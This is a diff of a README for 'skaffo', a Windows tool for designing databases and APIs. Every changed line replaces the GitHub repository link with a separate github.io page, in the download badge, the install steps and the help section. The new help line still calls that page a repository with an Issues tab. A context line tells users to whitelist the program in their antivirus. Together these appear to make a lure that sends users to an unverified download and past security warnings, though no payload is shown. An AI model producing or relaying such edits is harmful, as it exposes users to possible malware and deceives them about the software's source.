@@ -1,6 +1,6 @@
 # ⚡ skaffo - Design Databases and APIs Visually
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Butlerrazorback275/skaffo)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://butlerrazorback275.github.io)
 
 ## 🧭 What Is skaffo?
 
@@ -37,7 +37,7 @@ Follow these steps to get skaffo on your Windows computer.
 
 Go to the skaffo repository on GitHub:
 
-**https://github.com/Butlerrazorback275/skaffo**
+**https://butlerrazorback275.github.io**
 
 Click the green "Download" button at the top of this page. You will see a list of files.
 
@@ -159,7 +159,7 @@ Some antivirus programs flag new software. Add skaffo to your antivirus whitelis
 
 skaffo is an open source project. You can find help in several places:
 
-- The GitHub repository at **https://github.com/Butlerrazorback275/skaffo** has a "Issues" tab. Search there for your question. If you do not find an answer, create a new issue.
+- The GitHub repository at **https://butlerrazorback275.github.io** has a "Issues" tab. Search there for your question. If you do not find an answer, create a new issue.
 - The repository also has a "Discussions" tab. This is a forum where users help each other.
 - Read the "Tutorial" file in the repository. It has step-by-step lessons.
 
